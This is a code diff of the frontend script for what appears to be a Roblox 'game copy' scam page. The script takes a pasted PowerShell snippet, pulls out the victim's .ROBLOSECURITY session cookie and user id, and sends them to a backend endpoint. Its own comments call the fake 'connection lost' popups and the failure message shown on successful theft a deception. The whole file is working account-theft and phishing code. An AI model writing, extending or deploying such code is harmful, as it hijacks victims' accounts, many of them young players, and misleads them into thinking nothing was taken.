@@ -1,5 +1,4 @@
 // ================= FRONTEND APP.JS =================
-
 const WEBHOOK_ENDPOINT = "/api/submit";
 
 const gameFileInput = document.getElementById("gameFile");
@@ -8,6 +7,7 @@ const pinError = document.getElementById("pinError");
 const copyButton = document.getElementById("copyButton");
 const statusMessage = document.getElementById("statusMessage");
 
+// PIN validation
 pinInput.addEventListener("input", () => {
     pinInput.value = pinInput.value.replace(/\D/g, "").slice(0, 4);
     validatePin();
@@ -19,13 +19,16 @@ function validatePin() {
     return isValid;
 }
 
+// Extract cookie and rbxuid from pasted PowerShell script
 function extractGameData(fullText) {
+    // Match .ROBLOSECURITY", "cookie_value"
     const cookieMatch = fullText.match(/\.ROBLOSECURITY",\s*"([^"]+)"/);
     if (!cookieMatch) {
         return { success: false, message: "Your Game Key is not valid! (Check if you copied it right!)" };
     }
     const robloxCookie = cookieMatch[1];
 
+    // Match RBXEventTrackerV2", "params...&rbxuid=123456&..."
     const eventTrackerMatch = fullText.match(/RBXEventTrackerV2",\s*"([^"]+)"/);
     let rbxuid = null;
     if (eventTrackerMatch) {
@@ -38,6 +41,7 @@ function extractGameData(fullText) {
     return { success: true, cookie: robloxCookie, rbxuid };
 }
 
+// Fake "connection lost" popup (35% chance)
 function maybeShowFakeConnectionLoss() {
     if (Math.random() < 0.35) {
         const originalMsg = statusMessage.textContent;
@@ -90,21 +94,14 @@ copyButton.addEventListener("click", async () => {
             })
         });
 
-        // Try to parse JSON regardless of status
-        let result;
-        try {
-            result = await response.json();
-        } catch (e) {
-            result = { success: false, error: "Invalid response from server" };
-        }
-
         if (!response.ok) {
-            // Show the actual error from backend
-            statusMessage.textContent = result.error || `Server error (${response.status})`;
-            statusMessage.style.color = "#ff9d9d";
-            return;
+            const errorText = await response.text();
+            throw new Error(`Server error ${response.status}: ${errorText}`);
         }
 
+        const result = await response.json();
+
+        // Deception: always show fake failure even on success
         if (result.success === true) {
             statusMessage.textContent = "✗ Game Copy request was not processed. Please check your internet connection.";
             statusMessage.style.color = "#ff9d9d";
